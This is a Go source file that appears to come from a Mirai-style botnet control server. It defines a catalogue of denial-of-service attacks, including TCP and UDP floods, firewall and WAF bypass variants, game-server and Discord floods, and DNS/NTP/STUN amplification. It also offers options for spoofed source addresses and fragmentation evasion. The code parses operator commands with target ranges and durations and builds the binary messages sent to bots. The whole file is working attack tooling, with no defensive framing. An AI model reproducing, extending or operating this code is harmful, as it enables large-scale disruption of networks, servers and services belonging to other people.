package main

import (
	"encoding/binary"
	"errors"
	"fmt"
	"net"
	"strconv"
	"strings"

	"github.com/mattn/go-shellwords"
)

type AttackInfo struct {
	attackID          uint8
	attackFlags       []uint8
	attackDescription string
}

type Attack struct {
	Duration uint32
	Type     uint8
	Targets  map[uint32]uint8
	Flags    map[uint8]string
}

type FlagInfo struct {
	flagID          uint8
	flagDescription string
}

var flagInfoLookup map[string]FlagInfo = map[string]FlagInfo{
	"len": FlagInfo{
		0,
		"Size of packet data, default is 512 bytes",
	},
	"rand": FlagInfo{
		1,
		"Randomize packet data content, default is 1 (yes)",
	},
	"tos": FlagInfo{
		2,
		"TOS field value in IP header, default is 0",
	},
	"ident": FlagInfo{
		3,
		"ID field value in IP header, default is random",
	},
	"ttl": FlagInfo{
		4,
		"TTL field in IP header, default is 255",
	},
	"df": FlagInfo{
		5,
		"Set the Dont-Fragment bit in IP header, default is 0 (no)",
	},
	"sport": FlagInfo{
		6,
		"Source port, default is random",
	},
	"dport": FlagInfo{
		7,
		"Destination port, default is random",
	},
	"domain": FlagInfo{
		8,
		"Domain name to attack",
	},
	"dhid": FlagInfo{
		9,
		"Domain name transaction ID, default is random",
	},
	"urg": FlagInfo{
		11,
		"Set the URG bit in IP header, default is 0 (no)",
	},
	"ack": FlagInfo{
		12,
		"Set the ACK bit in IP header, default is 0 (no) except for ACK flood",
	},
	"psh": FlagInfo{
		13,
		"Set the PSH bit in IP header, default is 0 (no)",
	},
	"rst": FlagInfo{
		14,
		"Set the RST bit in IP header, default is 0 (no)",
	},
	"syn": FlagInfo{
		15,
		"Set the ACK bit in IP header, default is 0 (no) except for SYN flood",
	},
	"fin": FlagInfo{
		16,
		"Set the FIN bit in IP header, default is 0 (no)",
	},
	"seqnum": FlagInfo{
		17,
		"Sequence number value in TCP header, default is random",
	},
	"acknum": FlagInfo{
		18,
		"Ack number value in TCP header, default is random",
	},
	"gcip": FlagInfo{
		19,
		"Set internal IP to destination ip, default is 0 (no)",
	},
	"method": FlagInfo{
		20,
		"HTTP method name, default is get",
	},
	"postdata": FlagInfo{
		21,
		"POST data, default is empty/none",
	},
	"path": FlagInfo{
		22,
		"HTTP path, default is /",
	},
	"ssl": FlagInfo{
		23,
		"Use HTTPS/SSL",
	},
	"conns": FlagInfo{
		24,
		"Number of connections",
	},
	"source": FlagInfo{
		25,
		"Source IP address, 255.255.255.255 for random",
	},
	"minlen": FlagInfo{
		26,
		"min len",
	},
	"maxlen": FlagInfo{
		27,
		"max len",
	},
	"payload": FlagInfo{
		28,
		"custom payload",
	},
	"repeat": FlagInfo{
		29,
		"number of times to repeat",
	},
	"inf": FlagInfo{
		30,
		"Interface of network",
	},
	"custom": FlagInfo{
		31,
		"Custom parameter",
	},
	"sadp": FlagInfo{
		32,
		"Attacks Hikvision devices",
	},
	"vac": FlagInfo{
		33,
		"VAC specific payloads",
	},
	"mf": FlagInfo{
		34,
		"Fragmentation evasion technique",
	},
	"frag_size": FlagInfo{
		35,
		"Fragment size in bytes for TCP IP fragmentation, default is 32",
	},
}

var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo{
	".tcpflood": AttackInfo{
		0,
		[]uint8{2, 3, 4, 5, 6, 7, 25, 0, 1},
		"Simple syn+ack flood to exhaust server resources",
	},
	".tcpboom": AttackInfo{
		1,
		[]uint8{2, 3, 4, 5, 6, 7, 25, 0, 1},
		"Enhanced TCP flood with crafted TCP options for bypass",
	},
	".tcpkiller": AttackInfo{
		2,
		[]uint8{2, 3, 4, 5, 6, 7, 25, 0, 1},
		"Syn+ack+rst packets to disrupt active TCP connections",
	},
	".tcpbypass": AttackInfo{
		3,
		[]uint8{2, 3, 4, 5, 6, 7, 25, 0, 1, 11, 12, 13, 14, 15, 16},
		"Randomized tcp flag flood to bypass firewall",
	},
	".tcpfrag": AttackInfo{
		4,
		[]uint8{2, 3, 4, 5, 6, 7, 25, 0, 1, 35},
		"TCP fragmentation flood to bypass deep packet inspection and WAF",
	},

	".tcpxmas": AttackInfo{
		5,
		[]uint8{2, 3, 4, 5, 7, 0, 1},
		"Xmas packet flood using urg+psh+fin to crash target",
	},
	".udpplain": AttackInfo{
		6,
		[]uint8{6, 7, 0, 1},
		"Plain udp flood with random or static payload",
	},
	".std": AttackInfo{
		7,
		[]uint8{6, 7, 0, 1},
		"Udp flood with standard hex payload to overload bandwidth",
	},
	".udpbypass": AttackInfo{
		8,
		[]uint8{6, 7, 0, 1},
		"Random length udp flood to bypass basic filtering",
	},
	".vse": AttackInfo{
		9,
		[]uint8{2, 3, 4, 5, 6, 7},
		"Valve Source Engine query flood to disrupt game servers",
	},
	".mixamp": AttackInfo{
		10,
		[]uint8{2, 3, 4, 5, 7, 25, 31},
		"High-volume amplification attack (DNS/NTP/STUN)",
	},
	".discord": AttackInfo{
		11,
		[]uint8{7},
		"Udp flood using Discord payload to mimic voice traffic",
	},
	".http": AttackInfo{
		12,
		[]uint8{7, 8, 20, 21, 22, 24},
		"Simple http flood optimized for higher requests",
	},
	"stop": AttackInfo{
		255,
		[]uint8{},
		"Stops all current attacks",
	},
}

func NewAttack(str string, admin int) (*Attack, error) {
	atk := &Attack{0, 0, make(map[uint32]uint8), make(map[uint8]string)}
	args, _ := shellwords.Parse(str)

	if len(args) == 0 {
		return nil, errors.New("Must specify an attack name")
	}
	var atkInfo AttackInfo
	atkInfo, exists := attackInfoLookup[args[0]]
	if !exists {
		return nil, errors.New(fmt.Sprintf("%s : Invalid command", args[0]))
	}
	atk.Type = atkInfo.attackID
	args = args[1:]
	if atkInfo.attackID == 255 {
		return atk, nil
	}
	if len(args) == 0 {
		return nil, errors.New("Must specify prefix/netmask as targets")
	}
	cidrArgs := strings.Split(args[0], ",")
	if len(cidrArgs) > 255 {
		return nil, errors.New("Cannot specify more than 255 targets in a single attack!")
	}
	for _, cidr := range cidrArgs {
		cidrInfo := strings.Split(cidr, "/")
		if len(cidrInfo) == 0 {
			return nil, errors.New("Blank target specified!")
		}
		prefix := cidrInfo[0]
		netmask := uint8(32)
		if len(cidrInfo) == 2 {
			netmaskTmp, err := strconv.Atoi(cidrInfo[1])
			if err != nil || netmaskTmp > 32 || netmaskTmp < 0 {
				return nil, errors.New(fmt.Sprintf("Invalid netmask was supplied, near %s", cidr))
			}
			netmask = uint8(netmaskTmp)
		} else if len(cidrInfo) > 2 {
			return nil, errors.New(fmt.Sprintf("Too many /'s in prefix, near %s", cidr))
		}
		ip := net.ParseIP(prefix)
		if ip == nil {
			return nil, errors.New(fmt.Sprintf("Failed to parse IP address, near %s", cidr))
		}
		atk.Targets[binary.BigEndian.Uint32(ip[12:])] = netmask
	}
	args = args[1:]

	if len(args) == 0 {
		return nil, errors.New("Must specify an attack duration")
	}
	duration, err := strconv.Atoi(args[0])
	if err != nil || duration == 0 || duration > 21600 {
		return nil, errors.New(fmt.Sprintf("Invalid attack duration, near %s. Duration must be between 0 and 21600 seconds", args[0]))
	}
	atk.Duration = uint32(duration)
	args = args[1:]

	for len(args) > 0 {
		flagSplit := strings.SplitN(args[0], "=", 2)
		if len(flagSplit) != 2 {
			return nil, errors.New(fmt.Sprintf("Invalid key=value flag combination near %s", args[0]))
		}
		flagInfo, exists := flagInfoLookup[flagSplit[0]]
		if !exists || !uint8InSlice(flagInfo.flagID, atkInfo.attackFlags) || (admin == 0 && flagInfo.flagID == 25) {
			return nil, errors.New(fmt.Sprintf("Invalid flag key %s, near %s", flagSplit[0], args[0]))
		}
		if flagSplit[1][0] == '"' {
			flagSplit[1] = flagSplit[1][1 : len(flagSplit[1])-1]
		}
		if flagSplit[1] == "true" {
			flagSplit[1] = "1"
		} else if flagSplit[1] == "false" {
			flagSplit[1] = "0"
		}
		atk.Flags[uint8(flagInfo.flagID)] = flagSplit[1]
		args = args[1:]
	}
	if len(atk.Flags) > 255 {
		return nil, errors.New("Cannot have more than 255 flags")
	}

	return atk, nil
}

func (this *Attack) Build() ([]byte, error) {
	buf := make([]byte, 0)
	var tmp []byte

	tmp = make([]byte, 4)
	binary.BigEndian.PutUint32(tmp, this.Duration)
	buf = append(buf, tmp...)

	buf = append(buf, byte(this.Type))

	buf = append(buf, byte(len(this.Targets)))

	for prefix, netmask := range this.Targets {
		tmp = make([]byte, 5)
		binary.BigEndian.PutUint32(tmp, prefix)
		tmp[4] = byte(netmask)
		buf = append(buf, tmp...)
	}

	buf = append(buf, byte(len(this.Flags)))

	for key, val := range this.Flags {
		tmp = make([]byte, 2)
		tmp[0] = key
		strbuf := []byte(val)
		if len(strbuf) > 255 {
			return nil, errors.New("Flag value cannot be more than 255 bytes!")
		}
		tmp[1] = uint8(len(strbuf))
		tmp = append(tmp, strbuf...)
		buf = append(buf, tmp...)
	}

	if len(buf) > 4096 {
		return nil, errors.New("Max buffer is 4096")
	}
	tmp = make([]byte, 2)
	binary.BigEndian.PutUint16(tmp, uint16(len(buf)+2))
	buf = append(tmp, buf...)

	return buf, nil
}

func uint8InSlice(a uint8, list []uint8) bool {
	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}
